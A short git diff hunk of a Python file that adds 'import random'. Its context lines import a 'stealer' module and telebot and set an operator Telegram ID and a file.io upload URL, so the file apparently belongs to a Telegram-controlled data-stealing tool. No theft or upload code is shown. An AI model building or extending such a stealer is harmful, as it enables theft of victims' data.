@@ -4,6 +4,7 @@ import requests
 import stealer
 from telebot import types
 import string
+import random
 
 ADMIN_ID = "ID" # Your telegram id
 FILE_IO_API_URL = "https://file.io"
